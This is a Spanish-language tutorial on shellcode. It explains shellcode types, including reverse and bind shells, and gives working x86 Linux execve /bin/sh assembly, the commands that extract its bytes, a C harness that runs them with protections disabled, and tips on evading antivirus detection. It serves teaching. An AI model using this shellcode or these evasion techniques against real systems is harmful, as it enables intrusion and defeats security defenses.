# Shellcodes

### 1. ¿Qué es un Shellcode?
Un **shellcode** es un fragmento de código en lenguaje ensamblador diseñado para ejecutarse dentro de un proceso objetivo. 
Se usa comúnmente en **exploits** para tomar el control de un sistema vulnerable.

Los shellcodes pueden ejecutarse en memoria sin necesidad de archivos, lo que los hace ideales para ataques como **buffer overflows** o **inyecciones de código**.

### 2. Tipos de Shellcodes
Existen diferentes tipos de shellcodes según el contexto de ataque:

- **Shellcodes de usuario**: Se ejecutan dentro de procesos de usuario sin privilegios elevados.
- **Shellcodes de kernel**: Se ejecutan en el espacio de kernel, lo que permite un control total del sistema.
- **Shellcodes conectados a red**:
  - **Reverse shell**: Se conecta a un servidor remoto y permite al atacante tomar el control.
  - **Bind shell**: Abre un puerto en la máquina víctima para que el atacante se conecte.

### 3. Características de un Shellcode
Un shellcode efectivo debe cumplir con los siguientes criterios:

- **Pequeño**: Minimiza el tamaño para encajar en buffers pequeños.
- **Autocontenido**: No depende de librerías externas.
- **Evasivo**: Evita caracteres nulos (`\x00`) y detección por antivirus.
- **Portable**: Funciona en múltiples versiones del sistema operativo objetivo.

### 4. Creación de un Shellcode
Para crear un shellcode, se usa ensamblador y luego se convierte en una cadena de bytes. Por ejemplo, un shellcode en **x86 Linux** para ejecutar `/bin/sh`:

```assembly
section .text
    global _start

_start:
    xor eax, eax         ; Limpia eax
    push eax             ; NULL terminator
    push 0x68732f2f      ; "//sh"
    push 0x6e69622f      ; "/bin"
    mov ebx, esp         ; Apunta ebx a "/bin//sh"
    xor ecx, ecx         ; argv = NULL
    xor edx, edx         ; envp = NULL
    mov al, 0xb          ; syscall execve
    int 0x80             ; Llamada al kernel
```
### 5. Conversión de Shellcode a Cadena de Bytes

Para convertir un shellcode en ensamblador a una cadena de bytes.

Primero ensamblamos el código:

```bash
nasm -f elf32 shellcode.asm -o shellcode.o
```

Luego, lo vinculamos y obtenemos el shellcode en formato hexadecimal con `objdump`:

```bash
ld -m elf_i386 -o shellcode shellcode.o
objdump -d shellcode | grep '[0-9a-f]:' | grep -o '\b[0-9a-f]\{2\}\b' | tr -d '\n' | sed 's/\(..\)/\\x\1/g'
```

Este comando genera una cadena de bytes que se puede inyectar en un programa.

### 6. Uso del Shellcode en C

Podemos probar el shellcode en un programa en C:

```c
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";

int main() {
    printf("Ejecutando shellcode...\n");
    int (*ret)() = (int(*)())shellcode;
    ret();
}
```

Compilamos y ejecutamos:

```bash
gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode
./shellcode
```

Si se ejecuta correctamente, abrirá una shell interactiva.

### 7. Evasión de Detección

Para evitar detecciones, se pueden aplicar técnicas como:

- **Codificación XOR**: Para evitar bytes nulos y firmas conocidas.
- **Obfuscación**: Alterar el orden de instrucciones sin cambiar la funcionalidad.
- **Cifrado Polimórfico**: Utilizar decodificadores automáticos.
